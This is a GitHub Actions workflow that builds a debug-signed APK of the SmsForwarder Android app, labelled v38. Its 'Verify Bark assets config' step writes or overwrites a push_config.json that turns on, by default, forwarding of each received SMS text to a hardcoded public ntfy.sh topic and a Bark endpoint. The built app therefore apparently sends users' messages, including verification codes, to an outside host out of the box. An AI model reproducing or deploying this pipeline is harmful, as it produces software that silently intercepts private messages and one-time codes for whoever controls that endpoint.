name: Build SmsForwarder v38 Force Bark Assets APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Setup Java 17 for Android SDK
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 17

      - name: Prepare Android SDK
        run: |
          set -e
          rm -rf "$ANDROID_HOME/platforms/android-31" "$ANDROID_HOME/platforms/android-32" "$ANDROID_HOME/platforms/android-33" "$ANDROID_HOME/platforms/android-34" "$ANDROID_HOME/platforms/android-35" "$ANDROID_HOME/platforms/android-36" || true
          rm -rf "$ANDROID_HOME/build-tools/31"* "$ANDROID_HOME/build-tools/32"* "$ANDROID_HOME/build-tools/33"* "$ANDROID_HOME/build-tools/34"* "$ANDROID_HOME/build-tools/35"* "$ANDROID_HOME/build-tools/36"* || true
          yes | "$ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager" "platforms;android-30" "build-tools;30.0.3"

      - name: Setup Java 11 for Gradle Build
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 11

      - name: Force locate v38 source
        run: |
          set -e

          echo "当前仓库文件："
          find . -maxdepth 3 -type f | sort

          PROJECT_DIR=""
          mkdir -p ./forced-v38-source

          SOURCE_ZIP=""

          # 优先找 v38 / v37 / v36 新源码包，避免误打旧源码
          for f in *v38*.zip *V38*.zip */*v38*.zip */*V38*.zip *v37*.zip *V37*.zip */*v37*.zip */*V37*.zip *v36*.zip *V36*.zip */*v36*.zip */*V36*.zip; do
            [ -f "$f" ] || continue
            SOURCE_ZIP="$f"
            break
          done

          # 如果没找到新版本 zip，再退一步找任意 zip
          if [ -z "$SOURCE_ZIP" ]; then
            for f in *.zip */*.zip */*/*.zip; do
              [ -f "$f" ] || continue
              SOURCE_ZIP="$f"
              break
            done
          fi

          if [ -n "$SOURCE_ZIP" ]; then
            echo "强制使用源码 zip：$SOURCE_ZIP"
            unzip -o "$SOURCE_ZIP" -d ./forced-v38-source

            FOUND_GRADLEW=$(find ./forced-v38-source -name gradlew -type f | head -n 1 || true)
            if [ -z "$FOUND_GRADLEW" ]; then
              echo "错误：解压后没有找到 gradlew，这个 zip 不是完整 Android 源码。"
              exit 1
            fi

            PROJECT_DIR=$(dirname "$FOUND_GRADLEW")
          else
            echo "没有找到 zip，尝试使用仓库里的源码。"
            if [ -f "./gradlew" ]; then
              PROJECT_DIR="$PWD"
            else
              FOUND_GRADLEW=$(find . -name gradlew -type f | head -n 1 || true)
              if [ -n "$FOUND_GRADLEW" ]; then
                PROJECT_DIR=$(dirname "$FOUND_GRADLEW")
              fi
            fi
          fi

          if [ -z "$PROJECT_DIR" ]; then
            echo "错误：没有找到 Android 项目 gradlew。"
            exit 1
          fi

          echo "找到项目目录：$PROJECT_DIR"
          echo "PROJECT_DIR=$PROJECT_DIR" >> "$GITHUB_ENV"

      - name: Verify Bark assets config
        run: |
          set -e
          cd "$PROJECT_DIR"

          ASSETS_DIR=$(find . -path "*/src/main/assets" -type d | head -n 1 || true)

          if [ -z "$ASSETS_DIR" ]; then
            ASSETS_DIR="./app/src/main/assets"
            mkdir -p "$ASSETS_DIR"
          fi

          CONFIG_FILE="$ASSETS_DIR/push_config.json"

          echo "检查 push_config.json：$CONFIG_FILE"

          if [ ! -f "$CONFIG_FILE" ]; then
            cat > "$CONFIG_FILE" <<'EOF'
          {
            "enabled": true,
            "senders": [
              {
                "enabled": true,
                "name": "默认Webhook",
                "type": "webhook",
                "webServer": "https://ntfy.sh/telegram-api_anquan-top-zhongxing-3niu99",
                "method": "POST",
                "secret": "",
                "webParams": "{text:[msg]}"
              },
              {
                "enabled": true,
                "name": "默认Bark",
                "type": "bark",
                "server": "https://api.day.app/1234567890ABCDEFG/",
                "icon": ""
              }
            ]
          }
          EOF
          else
            if grep -q "默认Bark" "$CONFIG_FILE"; then
              echo "已经存在默认Bark。"
            else
              echo "当前 push_config.json 没有 Bark，自动改成 Webhook + Bark 配置。"
              cat > "$CONFIG_FILE" <<'EOF'
          {
            "enabled": true,
            "senders": [
              {
                "enabled": true,
                "name": "默认Webhook",
                "type": "webhook",
                "webServer": "https://ntfy.sh/telegram-api_anquan-top-zhongxing-3niu99",
                "method": "POST",
                "secret": "",
                "webParams": "{text:[msg]}"
              },
              {
                "enabled": true,
                "name": "默认Bark",
                "type": "bark",
                "server": "https://api.day.app/1234567890ABCDEFG/",
                "icon": ""
              }
            ]
          }
          EOF
            fi
          fi

          echo "最终 push_config.json 内容："
          cat "$CONFIG_FILE"

      - name: Verify brand tutorials config
        run: |
          set -e
          cd "$PROJECT_DIR"

          ASSETS_DIR=$(find . -path "*/src/main/assets" -type d | head -n 1 || true)

          if [ -z "$ASSETS_DIR" ]; then
            ASSETS_DIR="./app/src/main/assets"
            mkdir -p "$ASSETS_DIR"
          fi

          TUTORIAL_FILE="$ASSETS_DIR/brand_tutorials.json"

          if [ ! -f "$TUTORIAL_FILE" ]; then
            cat > "$TUTORIAL_FILE" <<'EOF'
          {
            "xiaomi": {
              "button": "小米教程",
              "title": "小米手机设置教程",
              "content": "这里写小米教程，后续可用MT管理器修改。"
            },
            "huawei": {
              "button": "华为教程",
              "title": "华为手机设置教程",
              "content": "这里写华为教程，后续可用MT管理器修改。"
            },
            "oppo": {
              "button": "OPPO教程",
              "title": "OPPO手机设置教程",
              "content": "这里写OPPO教程，后续可用MT管理器修改。"
            },
            "vivo": {
              "button": "vivo教程",
              "title": "vivo手机设置教程",
              "content": "这里写vivo教程，后续可用MT管理器修改。"
            },
            "common": {
              "button": "设置教程",
              "title": "手机设置教程",
              "content": "这里写通用教程，后续可用MT管理器修改。"
            }
          }
          EOF
          fi

          echo "brand_tutorials.json 内容："
          cat "$TUTORIAL_FILE"

      - name: Create signing files
        run: |
          set -e
          cd "$PROJECT_DIR"

          mkdir -p keystore
          mkdir -p app/keystore

          keytool -genkeypair -v \
            -keystore keystore/debug.keystore \
            -storepass android \
            -alias androiddebugkey \
            -keypass android \
            -keyalg RSA \
            -keysize 2048 \
            -validity 10000 \
            -dname "CN=Android Debug,O=Android,C=US"

          cp keystore/debug.keystore app/debug.keystore || true
          cp keystore/debug.keystore app/keystore/debug.keystore || true
          cp keystore/debug.keystore debug.keystore || true

          cat > keystore.properties <<EOF
          keyAlias=androiddebugkey
          keyPassword=android
          storeFile=keystore/debug.keystore
          storePassword=android
          EOF

          cat > app/keystore.properties <<EOF
          keyAlias=androiddebugkey
          keyPassword=android
          storeFile=debug.keystore
          storePassword=android
          EOF

          cat > app/keystore/keystore.properties <<EOF
          keyAlias=androiddebugkey
          keyPassword=android
          storeFile=debug.keystore
          storePassword=android
          EOF

      - name: Build Debug APK
        run: |
          set -e
          cd "$PROJECT_DIR"
          chmod +x ./gradlew
          ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: SmsForwarder-v38-force-bark-assets-apk
          path: |
            ${{ env.PROJECT_DIR }}/app/build/outputs/apk/debug/*.apk
            ${{ env.PROJECT_DIR }}/app/build/outputs/apk/**/*.apk
